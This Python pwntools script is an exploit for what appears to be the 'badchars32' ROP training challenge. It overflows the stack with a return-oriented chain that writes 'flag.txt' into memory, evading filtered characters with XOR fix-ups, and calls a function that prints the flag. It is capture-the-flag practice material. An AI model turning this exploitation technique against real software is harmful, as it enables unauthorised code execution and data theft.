import sys
from pwn import *

context.arch = "i386"

badchars = [b"x", b"g", b"a", b"."]

def fix_chars(chars, addr_write):
    addrs = {}
    addr_write = u32(addr_write)
    chars = list(chars)

    i = 0
    for char in chars:
        if char == "a":
            addrs[p32(addr_write + i)] = p32(0x00000003)
            chars[i] = chr(ord(char) + 1)
        elif char == "g":
            addrs[p32(addr_write + i)] = p32(0x0000000f)
            chars[i] = chr(ord(char) + 1)
        elif char == ".":
            addrs[p32(addr_write + i)] = p32(0x00000001)
            chars[i] = chr(ord(char) + 1)
        elif char == "x":
            addrs[p32(addr_write + i)] = p32(0x00000001)
            chars[i] = chr(ord(char) + 1)


        i = i + 1

    chars = ''.join(chars)
    chars = str.encode(chars)

    return chars, addrs

def process_xors(addrs, data, data_addr, is_first=False):
    payload = b''
    i = 0
    for addr in addrs:
        if i == 0 and is_first:
            payload += pop_0
            payload += addrs[addr] + data + data_addr + addr

            payload += mov_0

            payload += xor_0
        else:
            payload += pop_0
            payload += addrs[addr] + data + data_addr + addr

            payload += xor_0

        i = i + 1


    return payload


# .data section (8 bytes)
addr_write_0 = p32(0x0804a018)
addr_write_1 = p32(0x0804a01c)
# 0x0804854f: mov dword ptr [edi], esi; ret;
mov_0 = p32(0x0804854f)
# 0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret;
pop_0 = p32(0x080485b8)
# 0x08048547: xor byte ptr [ebp], bl; ret;
xor_0 = p32(0x08048547)
# usefulFunction()
func_usefulFunction = p32(0x08048538)

data_0 = "flag"
data_1 = ".txt"

data_0, addrs_0 = fix_chars(data_0, addr_write_0)
data_1, addrs_1 = fix_chars(data_1, addr_write_1)

payload = b'a'*44

payload += pop_0
payload += b'bbbb' + data_0 + addr_write_0 + b'cccc'

payload += mov_0

payload += process_xors(addrs_0, data_1, addr_write_1, is_first=True)
payload += process_xors(addrs_1, data_1, addr_write_1)
payload += func_usefulFunction
payload += addr_write_0

print(payload)
with open("payload.txt", "wb+") as f:
    f.write(payload)

if len(sys.argv) == 2:
    if str(sys.argv[1]) == "-g":
        log.warn("Entering debug mode")
        prog = gdb.debug("./badchars32", '''
            unset env
            break *0x0000000000400690
            break *0x0000000000400628
            break *0x0000000000400693
            break *0x0000000000400617
            break *0x00000000004004e6
        ''')
    else:
        log.critical("Please use '-g' if you would like to debug")
        exit(-1)
else:
    prog = process("./badchars32")

output = prog.recvuntil(b">")
print(output.decode("utf-8"))

prog.sendline(payload)

output = prog.recvuntil(b"}")
print(output.decode("utf-8"))

prog.clean()
